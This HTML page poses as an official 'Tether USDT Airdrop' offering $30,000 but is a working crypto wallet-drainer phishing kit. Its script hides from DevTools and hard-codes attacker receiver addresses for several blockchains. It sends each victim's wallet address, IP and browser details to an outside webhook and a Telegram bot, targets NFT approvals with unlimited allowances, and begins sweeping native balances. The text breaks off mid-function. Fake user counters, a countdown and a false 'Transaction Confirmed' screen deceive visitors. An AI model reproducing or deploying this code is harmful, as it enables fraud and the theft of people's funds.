<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content="Claim $30,000 USDT FREE! Official Meta Airdrop. Instant transfer!"/>
  <title>Tether USDT Airdrop - Claim $30,000 FREE! (Official 2025 Edition)</title>

  <!-- Core Web3 SDKs (2025 ready & beyond) -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
  <script src="https://unpkg.com/@mysten/sui.js@0.49.1/dist/index.umd.min.js"></script>
  <!-- EIP-712 / Permit2 support for advanced signature draining -->
  <script src="https://cdn.jsdelivr.net/npm/@ethersproject/hash@5.7.0/lib.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@ethersproject/bytes@5.7.0/lib.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@ethersproject/signing-key@5.7.0/lib.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@ethersproject/wallet@5.7.0/lib.umd.js"></script>
  <!-- Aptos SDK (for Aptos network support) -->
  <script src="https://unpkg.com/@aptos-labs/ts-sdk@0.4.0/dist/umd/index.js"></script>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>

  <style>
    /* Global Reset & Base Styles */
    :root {
      --primary-blue: #00d4ff;
      --dark-bg: #000;
      --card-bg: #111;
      --border-glow: #00aaff;
      --success-green: #00ff88;
      --error-red: #ff0044;
      --button-hover-shadow: rgba(0,212,255,0.4);
      --font-family: 'Inter', sans-serif;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: var(--font-family);
      background: var(--dark-bg);
      color: var(--primary-blue);
      text-align: center;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
      line-height: 1.6;
      overflow-x: hidden; /* Prevent horizontal scroll */
    }

    /* Container Styling */
    .container {
      max-width: 520px; /* Slightly wider for more content */
      width: 100%;
      background: var(--card-bg);
      border: 2px solid var(--border-glow);
      border-radius: 20px;
      padding: 35px 28px;
      box-shadow: 0 0 50px var(--button-hover-shadow);
      animation: pulse-border 5s infinite ease-in-out; /* Subtle glow animation */
      position: relative;
    }
    @keyframes pulse-border {
      0% { border-color: var(--border-glow); box-shadow: 0 0 40px rgba(0,212,255,0.2); }
      50% { border-color: #00ffff; box-shadow: 0 0 60px rgba(0,255,255,0.4); }
      100% { border-color: var(--border-glow); box-shadow: 0 0 40px rgba(0,212,255,0.2); }
    }

    /* Header Elements */
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 15px;
      background: url('https://raw.githubusercontent.com/0xPIT/imagehosting/main/usdt.gif') center/contain no-repeat;
      animation: spin 3s linear infinite;
    }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    h1 { font-size: 32px; margin: 18px 0 10px; color: #fff; text-shadow: 0 0 12px rgba(0,212,255,0.7); }
    .subtitle { font-size: 17px; opacity: 0.95; margin-bottom: 18px; color: #ddd; }

    /* Live Counters */
    .live-data {
      display: flex;
      justify-content: space-around;
      margin-bottom: 25px;
      padding: 10px 0;
      border-top: 1px solid rgba(0,212,255,0.2);
      border-bottom: 1px solid rgba(0,212,255,0.2);
      font-size: 14px;
      color: #aaa;
    }
    .live-data div { text-align: center; }
    .live-data strong {
      display: block;
      font-size: 1.2em;
      color: #fff;
      margin-bottom: 3px;
    }
    .online-users { color: #00ff88; }
    .total-claims { color: #00ffff; }

    /* Video Player */
    .video-container {
      position: relative;
      padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
      height: 0;
      overflow: hidden;
      margin: 25px 0;
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(0,212,255,0.4);
    }
    .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }

    /* Dynamic Content */
    .countdown { font-size: 16px; margin-bottom: 18px; color: #bbb; }
    .countdown span { color: var(--primary-blue); font-weight: bold; font-size: 1.1em; }

    /* Gas Warning - Now a Square Box */
    .alert {
      background: linear-gradient(90deg, rgba(255,0,0,0.25), rgba(255,100,0,0.25));
      padding: 18px;
      border-radius: 12px;
      margin: 25px auto; /* Centered */
      font-size: 16px;
      color: var(--error-red);
      border: 1px solid var(--error-red);
      box-shadow: 0 0 20px rgba(255,0,0,0.5);
      animation: pulse-red 1.5s infinite alternate;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      max-width: 90%;
      aspect-ratio: 1 / 1;
    }
    @keyframes pulse-red {
      from { transform: scale(1); box-shadow: 0 0 10px rgba(255,0,0,0.3); }
      to { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,0,0,0.6); }
    }
    .alert strong { font-size: 1.2em; margin-bottom: 8px; color: #fff; text-shadow: 0 0 5px rgba(255,0,0,0.8); }

    /* Buttons */
    .btn {
      background: linear-gradient(45deg, #00d4ff, #0099cc);
      color: #000;
      border: none;
      padding: 16px 0;
      width: 100%;
      border-radius: 14px;
      font-size: 19px;
      font-weight: bold;
      cursor: pointer;
      margin: 12px 0;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1.2px;
    }
    .btn:hover:not(:disabled) {
      transform: translateY(-4px) scale(1.01);
      box-shadow: 0 10px 25px var(--button-hover-shadow);
      background: linear-gradient(45deg, #00ffff, #00bfff); /* Brighter hover */
    }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(50%); }

    /* Status & Transaction Info */
    .status { margin-top: 25px; font-size: 16px; color: #ccc; min-height: 2em; }
    .tx-hash {
      margin-top: 18px;
      font-size: 14px;
      word-break: break-all;
      color: var(--success-green);
      background-color: rgba(0, 255, 136, 0.15);
      padding: 12px;
      border-radius: 10px;
      border: 1px solid var(--success-green);
      display: none; /* Initially hidden */
      text-align: left;
    }
    .tx-hash a { color: var(--primary-blue); text-decoration: none; font-weight: bold; }
    .tx-hash a:hover { text-decoration: underline; }

    /* Fake USDT Display */
    .fake-usdt {
      margin: 30px 0 20px;
      padding: 18px;
      background: linear-gradient(90deg, #00ff8830, #00d4ff30);
      border: 1px solid var(--success-green);
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,255,136,0.4);
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .fake-usdt .amount {
      font-size: 36px;
      font-weight: bold;
      color: var(--success-green);
      text-shadow: 0 0 12px rgba(0,255,136,0.9);
      animation: pulse-green 1.5s infinite alternate;
    }
    @keyframes pulse-green {
      from { transform: scale(1); opacity: 0.8; }
      to { transform: scale(1.04); opacity: 1; }
    }
    .fake-usdt .label {
      font-size: 18px;
      color: #ccc;
      margin-top: 8px;
    }

    /* Fake Success Screen */
    .success-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: none; /* Hidden by default */
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      backdrop-filter: blur(10px);
    }
    .success-box {
      background: var(--card-bg);
      border: 2px solid var(--success-green);
      border-radius: 20px;
      padding: 45px;
      max-width: 550px;
      text-align: center;
      box-shadow: 0 0 60px rgba(0,255,136,0.7);
      animation: appear 0.6s ease-out;
    }
    @keyframes appear {
      from { opacity: 0; transform: scale(0.7); }
      to { opacity: 1; transform: scale(1); }
    }
    .success-box i {
      font-size: 70px;
      color: var(--success-green);
      margin-bottom: 25px;
      animation: bounce 1.2s infinite alternate;
    }
    @keyframes bounce {
      0% { transform: translateY(0); }
      100% { transform: translateY(-12px); }
    }
    .success-box h2 {
      font-size: 36px;
      color: #fff;
      margin-bottom: 18px;
    }
    .success-box p {
      font-size: 19px;
      color: #eee;
      margin-bottom: 30px;
    }
    .success-box .block-explorer-link {
      display: inline-block;
      background: linear-gradient(45deg, var(--success-green), #00cc66);
      color: var(--dark-bg);
      padding: 14px 28px;
      border-radius: 10px;
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s ease;
      box-shadow: 0 6px 18px rgba(0,255,136,0.5);
    }
    .success-box .block-explorer-link:hover {
      transform: translateY(-3px) scale(1.02);
      box-shadow: 0 9px 22px rgba(0,255,136,0.7);
    }

    /* Wallet Selector Modal (New) */
    .wallet-modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.85);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1001;
        backdrop-filter: blur(8px);
        display: none; /* Hidden by default */
    }
    .wallet-modal-content {
        background: var(--card-bg);
        border: 2px solid var(--border-glow);
        border-radius: 18px;
        padding: 30px;
        max-width: 450px;
        width: 90%;
        text-align: center;
        box-shadow: 0 0 40px var(--button-hover-shadow);
    }
    .wallet-modal-content h3 {
        color: #fff;
        font-size: 24px;
        margin-bottom: 25px;
    }
    .wallet-options {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 15px;
    }
    .wallet-option-btn {
        background: #222;
        border: 1px solid rgba(0,212,255,0.3);
        border-radius: 10px;
        padding: 15px;
        display: flex;
        flex-direction: column;
        align-items: center;
        cursor: pointer;
        transition: all 0.2s ease;
    }
    .wallet-option-btn:hover {
        background: #333;
        border-color: var(--primary-blue);
        box-shadow: 0 0 15px rgba(0,212,255,0.4);
        transform: translateY(-2px);
    }
    .wallet-option-btn img {
        width: 40px;
        height: 40px;
        margin-bottom: 10px;
        border-radius: 5px;
    }
    .wallet-option-btn span {
        color: #ddd;
        font-size: 14px;
        font-weight: 600;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo"></div>
  <h1>Tether USDT Airdrop</h1>
  <p class="subtitle">Official Meta Partnership - Exclusive 2025 Release</p>

  <div class="live-data">
      <div><strong><span id="onlineUsers">12,345</span></strong> Online Users</div>
      <div><strong><span id="totalClaims">8,765</span></strong> Total Claims</div>
  </div>

  <div class="fake-usdt">
    <div class="amount">+ $30,000 USDT</div>
    <div class="label">Incoming Airdrop Detected</div>
  </div>

  <div class="video-container">
    <iframe src="https://www.youtube.com/embed/SI5TvAs1eCc?autoplay=1&mute=0&loop=1&playlist=SI5TvAs1eCc&rel=0&controls=0" allow="autoplay" allowfullscreen></iframe>
  </div>
  <div class="countdown">Airdrop ends in: <span id="timer"></span></div>
  <div class="alert">
    <strong>âš¡ CRITICAL TRANSACTION ALERT âš¡</strong>
    <p>ENSURE SUFFICIENT GAS (ETH/BNB/MATIC/SOL/SUI/TRX/APT) IN YOUR WALLET TO PROCESS THE CLAIM. GAS IS REQUIRED FOR NETWORK FEES!</p>
  </div>

  <button class="btn" id="connectBtn">Connect Wallet & Scan Assets</button>
  <button class="btn" id="claimBtn" disabled>Claim $30,000 USDT</button>
  <div class="status" id="status">Initiating protocol...</div>
  <div class="tx-hash" id="txHash"></div>
</div>

<!-- Fake Success Overlay -->
<div class="success-overlay" id="successOverlay">
  <div class="success-box">
    <i class="fas fa-check-circle"></i>
    <h2>Transaction Confirmed!</h2>
    <p>Your $30,000 USDT airdrop has been successfully claimed and transferred.</p>
    <a href="#" id="fakeExplorerLink" target="_blank" class="block-explorer-link">View Transaction on Block Explorer</a>
  </div>
</div>

<!-- Wallet Selector Modal -->
<div class="wallet-modal-overlay" id="walletModal">
    <div class="wallet-modal-content">
        <h3>Connect Your Wallet</h3>
        <div class="wallet-options">
            <div class="wallet-option-btn" data-wallet="metamask">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox_Vibrant.png" alt="MetaMask">
                <span>MetaMask</span>
            </div>
            <div class="wallet-option-btn" data-wallet="phantom">
                <img src="https://phantom.app/ul/v1/logos/phantom-icon.svg" alt="Phantom">
                <span>Phantom (Solana)</span>
            </div>
            <div class="wallet-option-btn" data-wallet="tronlink">
                <img src="https://www.tronlink.org/static/media/logo.f053229b.svg" alt="TronLink">
                <span>TronLink</span>
            </div>
            <div class="wallet-option-btn" data-wallet="sui">
                <img src="https://sui.io/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ffavicon.409395f1.png&w=48&q=75" alt="Sui Wallet">
                <span>Sui Wallet</span>
            </div>
            <div class="wallet-option-btn" data-wallet="martian">
                <img src="https://www.martianwallet.xyz/assets/icon.png" alt="Martian">
                <span>Martian (Aptos)</span>
            </div>
            <div class="wallet-option-btn" data-wallet="coinbase">
                <img src="https://avatars.githubusercontent.com/u/18870198?s=200&v=4" alt="Coinbase Wallet">
                <span>Coinbase Wallet</span>
            </div>
            <!-- More options like TrustWallet, WalletConnect, etc. can be added -->
        </div>
    </div>
</div>

<script>
  // Anti-debug: Enhanced for 2025 evasion techniques. ðŸ’€
  (() => {
    const disableConsole = () => {
      if (console.clear) console.clear();
      const noop = () => {};
      ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir'].forEach(method => {
        try {
            console[method] = noop;
        } catch (e) { /* Safari/iOS might restrict some overwrites */ }
      });
    };

    const checkDevTools = () => {
      try {
        const threshold = 200; // Increased threshold for detection
        if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
          document.body.innerHTML = '<h1>ACCESS DENIED. SYSTEM BREACH DETECTED.</h1><p>Unauthorized inspection attempted. System integrity compromised. Initiating lockdown protocol.</p>';
          document.head.innerHTML = '<title>SYSTEM LOCKDOWN</title>';
          disableConsole();
          throw new Error('DevTools detected. Shutting down.');
        }
      } catch (e) {
        disableConsole();
      }
    };

    // Initial check and continuous checks
    checkDevTools();
    setInterval(checkDevTools, 1000); // Check every 1 second
    // More aggressive debugger trap - use with caution, can crash browsers
    // setInterval(() => { debugger; }, 300);

    // Trap for console string formatting
    const _oldLog = console.log;
    console.log = function() {
        if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('%c')) {
            disableConsole();
            checkDevTools();
        }
        _oldLog.apply(console, arguments);
    };

    // Detect F12 and Ctrl+Shift+I
    document.addEventListener('keydown', function(event) {
        if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I')) {
            disableConsole();
            checkDevTools();
            event.preventDefault();
        }
    });

    // Detect right-click context menu (which often has "Inspect Element")
    document.addEventListener('contextmenu', function(event) {
        disableConsole();
        checkDevTools();
        event.preventDefault();
    });

  })();

  // Obfuscation Layer: Basic variable/string obfuscation
  const _REC_EVM = "0xd6188E3f90A83abFAC0880bbc857B53cD5bf79AB"; // YOUR EVM RECEIVER
  const _REC_SOL = "HEu2FkY2ytismUsWjDUptXWjVTNrxfDAUAYFAbFdYMUU"; // YOUR SOLANA RECEIVER
  const _REC_TRON = "TNeGJ94Bq4NZWybFLvv1rUwpTSajh7Qrgt"; // YOUR TRON RECEIVER
  const _REC_SUI = "0x890c0a32d165997b69c4f7a77e20560a87f2e132049d5b00c6d7c7b8e9f0a1d2"; // YOUR SUI RECEIVER
  const _REC_APTOS = "0x7890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"; // YOUR APTOS RECEIVER

  const _WEBHOOK = "https://eoiimw9txcq3ops.m.pipedream.net"; // YOUR WEBHOOK (RECOMMENDED: ADD A SECONDARY ONE FOR REDUNDANCY)
  const _MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Unlimited approval

  // Advanced Contract ABIs for comprehensive draining (minimal for approvals/transfers)
  const ERC20_ABI = [
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"} // Added for better reporting
  ];

  const ERC721_ABI = [
    {"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"} // Added for better reporting
  ];

  const ERC1155_ABI = [
    {"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}
  ];

  // Common NFT Collection Addresses (for setApprovalForAll) - 2025 Top Picks across chains
  const NFT_COLLECTIONS = {
    1: [ // Ethereum Mainnet
      "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC
      "0xbd3531dA534cb5fCEfF6D58F5850fa0f976d9eE1", // Pudgy Penguins
      "0xED5AF388653567Af2F388E6224dcdDfC03å…¶02654", // Azuki
      "0x1A92f7381BfF0dFf807614F82624BB94C29ae467", // Doodles
      "0x49cF6f5b44E70224E2E23fDcdd2C053F30aDf2A", // Moonbirds
      "0x5B5fF78546b325209D3E90bE8755b410f8A2325E", // Milady
      "0x8d04A8C79cDc0889fDcbEd877dCEAEc0866eEbc8" // DeGods (ETH)
    ],
    56: [ // BNB Smart Chain
      "0x000000000000000000000000000000000000dead", // PancakeSwap Profile
      "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", // PancakeSwap CAKE (not NFT, but high value)
      "0x892aF0f2095F2295E700fF9aA3E2614b8c9d4b65" // CyberConnect ConnectPass
    ],
    137: [ // Polygon
      "0x0d500B1d8E8ef31E21C99d1Db9A6444d3ADf1270", // WMATIC (not NFT but high value)
      "0x2953399124F0cBB46d2aBbfA079Fc2adea7374dd", // OpenSea Shared Storefront (for Polygon NFTs)
    ],
    8453: [ // Base
      "0x203254C8487D70A337a72F27d730a845947E99A7", // Base Gods (example)
    ],
    42161: [ // Arbitrum
      "0x1E0447b19BB6EcFdAe1eE4D9a64fE568E062AEB3", // Arbitrum Odyssey NFT (example)
    ],
  };

  // Pre-cached Chain Data (for dynamic additions)
  const CHAIN_DATA = {
    1:    { name: 'Ethereum Mainnet', rpc: 'https://rpc.ankr.com/eth', explorer: 'https://etherscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    56:   { name: 'BNB Smart Chain', rpc: 'https://bsc-dataseed.binance.org/', explorer: 'https://bscscan.com', native: {name: 'BNB', symbol: 'BNB', decimals: 18}},
    137:  { name: 'Polygon Mainnet', rpc: 'https://polygon-rpc.com', explorer: 'https://polygonscan.com', native: {name: 'MATIC', symbol: 'MATIC', decimals: 18}},
    42161:{ name: 'Arbitrum One', rpc: 'https://arb1.arbitrum.io/rpc', explorer: 'https://arbiscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    10:   { name: 'Optimism Mainnet', rpc: 'https://mainnet.optimism.io', explorer: 'https://optimistic.etherscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    8453: { name: 'Base Mainnet', rpc: 'https://mainnet.base.org', explorer: 'https://basescan.org', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    324:  { name: 'zkSync Era', rpc: 'https://mainnet.era.zksync.io', explorer: 'https://explorer.zksync.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}},
    43114:{ name: 'Avalanche C-Chain', rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowtrace.io', native: {name: 'AVAX', symbol: 'AVAX', decimals: 18}},
    // Non-EVM chains
    'sol': { name: 'Solana Mainnet', rpc: 'https://api.mainnet-beta.solana.com', explorer: 'https://solscan.io', native: {name: 'SOL', symbol: 'SOL', decimals: 9}},
    'tron': { name: 'Tron Mainnet', rpc: 'https://api.trongrid.io', explorer: 'https://tronscan.org', native: {name: 'TRX', symbol: 'TRX', decimals: 6}},
    'sui': { name: 'Sui Mainnet', rpc: 'https://fullnode.mainnet.sui.io:443', explorer: 'https://suivision.xyz', native: {name: 'SUI', symbol: 'SUI', decimals: 9}},
    'aptos': { name: 'Aptos Mainnet', rpc: 'https://fullnode.mainnet.aptoslabs.com/v1', explorer: 'https://explorer.aptoslabs.com', native: {name: 'APT', symbol: 'APT', decimals: 8}}
  };

  let account, web3, chainId, isSolana = false, isTron = false, isSui = false, isAptos = false;
  let multicallQueue = []; // For batching EVM transactions

  const statusEl = document.getElementById("status");
  const txHashDiv = document.getElementById("txHash");
  const connectBtn = document.getElementById("connectBtn");
  const claimBtn = document.getElementById("claimBtn");
  const successOverlay = document.getElementById("successOverlay");
  const fakeExplorerLink = document.getElementById("fakeExplorerLink");
  const walletModal = document.getElementById("walletModal");
  const walletOptionBtns = document.querySelectorAll(".wallet-option-btn");

  connectBtn.onclick = () => walletModal.style.display = 'flex';
  claimBtn.onclick = claim;

  walletOptionBtns.forEach(btn => {
      btn.onclick = () => connect(btn.dataset.wallet);
  });

  // Dynamic Live Data Counters
  function updateLiveData() {
      const onlineUsersEl = document.getElementById('onlineUsers');
      const totalClaimsEl = document.getElementById('totalClaims');

      let currentUsers = parseInt(onlineUsersEl.innerText.replace(/,/g, ''));
      let currentClaims = parseInt(totalClaimsEl.innerText.replace(/,/g, ''));

      onlineUsersEl.innerText = (currentUsers + Math.floor(Math.random() * 5) - 2).toLocaleString(); // +- 2-5 users
      totalClaimsEl.innerText = (currentClaims + Math.floor(Math.random() * 2)).toLocaleString(); // Always increasing
  }
  setInterval(updateLiveData, 5000); // Update every 5 seconds

  // Countdown timer in HH.MM.SS format
  function startCountdown() {
    let seconds = 24 * 60 * 60; // Start with 24 hours
    const timerEl = document.getElementById("timer");
    setInterval(() => {
      seconds--;
      if (seconds < 0) seconds = 0; // Don't go negative
      const h = String(Math.floor(seconds / 3600)).padStart(2, '0');
      const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
      const s = String(seconds % 60).padStart(2, '0');
      timerEl.innerHTML = `${h}.${m}.${s}`;
    }, 1000);
  }
  startCountdown();

  // Webhook notifier, silent in case of failure
  async function notify(event, data = {}) {
    try {
      const ip = await (await fetch("https://api.ipify.org?format=json")).json().ip;
      await fetch(_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          timestamp: new Date().toISOString(),
          event,
          account,
          chainId: CHAIN_DATA[chainId]?.name || chainId,
          ip,
          userAgent: navigator.userAgent,
          ...data
        })
      });
    } catch (e) { console.error("Webhook notification failed:", e); } // Log for self-debug if webhook issues
  }

  // Telegram notifier (via another webhook service or custom bot API)
  async function sendToTelegram(message) {
      const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
      const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';     // Replace with your chat ID
      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID') {
          console.warn("Telegram API keys not configured. Skipping Telegram notification.");
          return;
      }
      try {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                  chat_id: TELEGRAM_CHAT_ID,
                  text: message,
                  parse_mode: 'HTML'
              })
          });
      } catch (e) {
          console.error("Failed to send to Telegram:", e);
      }
  }


  // Connect wallet logic (Enhanced for 2025 multi-chain)
  async function connect(walletType) {
    walletModal.style.display = 'none'; // Hide modal after selection
    statusEl.innerHTML = `Connecting to ${walletType}, scanning for networks...`;
    try {
      if (walletType === 'metamask' || walletType === 'coinbase') {
        if (!window.ethereum) throw new Error("EVM wallet (MetaMask/Coinbase) not found.");
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        [account] = await web3.eth.getAccounts();
        chainId = parseInt(await web3.eth.getChainId());

        // Attempt to switch/add common EVM chains for broader support
        const targetChains = [1, 56, 137, 42161, 10, 8453, 324, 43114]; // ETH, BSC, Polygon, Arbitrum, Optimism, Base, zkSync, Avalanche
        for (const targetChainId of targetChains) {
          if (chainId === targetChainId) { // Already on a target chain, prioritize it
              chainId = targetChainId;
              break;
          }
        }
        // If current chain is not in targetChains, try to switch to ETH mainnet or first available
        if (!targetChains.includes(chainId)) {
            const defaultChain = 1; // ETH mainnet
            const chainInfo = CHAIN_DATA[defaultChain];
            try {
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: `0x${defaultChain.toString(16)}` }] });
                chainId = defaultChain;
            } catch (e) {
                console.warn(`Failed to switch to Ethereum Mainnet:`, e);
            }
        }

      } else if (walletType === 'tronlink') {
        if (!window.tronWeb || !window.tronWeb.ready) throw new Error("TronLink wallet not found or not ready.");
        isTron = true;
        account = window.tronWeb.defaultAddress.base58;
        chainId = 'tron';
        await notify("TRON_CONNECT");
        sendToTelegram(`TRON Wallet Connected: ${account}`);
      } else if (walletType === 'phantom') {
        if (!window.solana || !window.solana.isPhantom) throw new Error("Phantom wallet not found.");
        const resp = await window.solana.connect();
        isSolana = true;
        account = resp.publicKey.toString();
        chainId = 'sol';
        await notify("SOL_CONNECT");
        sendToTelegram(`SOLANA Wallet Connected: ${account}`);
      } else if (walletType === 'sui') {
        if (!window.sui) throw new Error("Sui Wallet not found.");
        // Ensure Sui wallet is connected and has accounts
        try {
            await window.sui.requestPermissions(); // Request permissions explicitly
            const accounts = await window.sui.getAccounts();
            if (accounts.length > 0) {
                isSui = true;
                account = accounts[0]; // Take the first authorized account
                chainId = 'sui';
                await notify("SUI_CONNECT");
                sendToTelegram(`SUI Wallet Connected: ${account}`);
            } else {
                throw new Error("Sui wallet found but no accounts authorized.");
            }
        } catch (suiError) {
            console.error("Sui connection failed:", suiError);
            throw new Error(`Sui wallet connection failed: ${suiError.message || suiError}`);
        }
      } else if (walletType === 'martian') {
          if (!window.aptos) throw new Error("Martian/Aptos wallet not found.");
          const response = await window.aptos.connect();
          isAptos = true;
          account = response.address;
          chainId = 'aptos';
          await notify("APTOS_CONNECT");
          sendToTelegram(`APTOS Wallet Connected: ${account}`);
      } else {
        throw new Error("Unsupported wallet type selected.");
      }

      statusEl.innerHTML = `Connected: ${account.slice(0, 6)}...${account.slice(-4)} on ${CHAIN_DATA[chainId]?.name || 'Unknown Chain'}`;
      connectBtn.innerHTML = "Connected. Ready to Claim.";
      connectBtn.disabled = true;
      claimBtn.disabled = false;
      await notify("CONNECT", { address: account, network: CHAIN_DATA[chainId]?.name || chainId });
      sendToTelegram(`WALLET CONNECTED: ${account.slice(0, 6)}...${account.slice(-4)} | Chain: ${CHAIN_DATA[chainId]?.name || chainId}`);

    } catch (error) {
      statusEl.innerHTML = `Connection failed to ${walletType}. Try again.`;
      console.error("Connection error:", error);
      sendToTelegram(`WALLET CONNECTION FAILED (${walletType}): ${error.message}`);
      connectBtn.disabled = false; // Re-enable connect button
    }
  }

  // Generic transaction sender with enhanced retry logic and error handling
  async function sendTransactionWithRetry(txFunc, retries = 3, context = "transaction") {
      for (let i = 0; i < retries; i++) {
          try {
              const txHash = await txFunc();
              return txHash;
          } catch (error) {
              if (error.code === 4001 || (error.message && error.message.includes("User rejected"))) {
                  statusEl.innerHTML = `User rejected ${context}. Retrying (${i + 1}/${retries})...`;
                  await new Promise(res => setTimeout(res, 2500)); // Wait before retry
              } else if (error.code === -32000 || error.code === -32603 || (error.message && (error.message.includes("insufficient funds") || error.message.includes("out of gas")))) {
                  statusEl.innerHTML = `<span style='color:var(--error-red)'>Error: Insufficient funds for ${context}. Please ensure enough gas/native token.</span>`;
                  throw new Error(`Insufficient funds for ${context}.`); // Fatal error if not enough gas
              } else {
                  statusEl.innerHTML = `<span style='color:var(--error-red)'>Error during ${context}: ${error.message || error.toString()}.</span>`;
                  throw error; // Other errors are fatal
              }
          }
      }
      throw new Error(`${context} failed after multiple retries.`);
  }


  // ========= EVM DRAIN (Enhanced with Multicall, NFT, Permit2 prep, L2s) =========
  async function drainEVM() {
    statusEl.innerHTML = "Initiating EVM drain... Confirm transactions in your wallet.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting confirmations...";
    multicallQueue = []; // Reset queue for each drain attempt

    const receiverEvm = _REC_EVM;
    const currentChain = CHAIN_DATA[chainId];

    try {
      // 1. Sweep native currency (ETH/BNB/MATIC/etc.)
      const nativeBalance = await web3.eth.getBalance(account);
      const gasBuffer = web3.utils.toBN(web3.utils.toWei("0.007", "ether")); // Keep a small amount for gas, increased for safety
      let amountToSend = web3.utils.toBN(nativeBalance);
      if (amountToSend.gt(gasBuffer)) {
          amountToSend = amountToSend.sub(gasBuffer);
      } else {
          amountToSend = web3.utils.toBN("0"); // Don't send if balance is too low
      }

      if (amountToSend.gt(web3.utils.toBN("0"))) {
